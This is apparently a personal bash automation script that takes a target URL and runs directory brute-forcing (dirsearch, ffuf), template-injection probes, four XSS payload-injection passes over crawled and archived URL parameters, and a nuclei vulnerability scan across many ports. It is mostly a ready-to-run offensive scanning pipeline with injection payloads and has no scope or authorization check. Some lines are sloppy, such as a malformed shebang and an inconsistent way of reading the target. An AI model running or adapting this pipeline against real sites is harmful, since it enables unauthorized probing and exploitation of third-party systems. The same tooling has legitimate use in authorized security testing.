#/bin/bash

figlet -c Tools

echo Insert URL:
read url
cd $url
echo
echo
echo

echo ================"INIT DIRSEARCH"================
echo
echo
python3 /home/edio/dirsearch/dirsearch.py -u $(cat url);
echo
echo
echo

echo ================"INIT FFUF"================ | anew ffuf
echo
echo
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u https://$url/FUZZ | anew ffuf;
echo
echo
echo

echo ================"INIT SSTI"================ | anew ssti2
echo
echo
echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2;
echo
echo
echo

echo ================"INIT XSSTRIKE"================ | anew xsstrike
echo
echo
python3 /home/edio/XSStrike/xsstrike.py -u $(cat url) | anew xsstrike;
echo
echo
echo

echo ================"INIT XSS1"================ | anew xss1
echo
echo
echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
echo
echo
echo

echo ================"INIT XSS2"================ | anew xss2
echo
echo
echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
echo
echo
echo

echo ================"INIT XSS3"================ | anew xss3
echo
echo
echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
echo
echo
echo

echo ================"INIT XSS4"================ | anew xss4
echo
echo
gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
echo
echo
echo

echo ================"INIT NUCLEI"================ | anew nuclei
echo
echo
echo $(cat url) | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;
echo
echo
echo
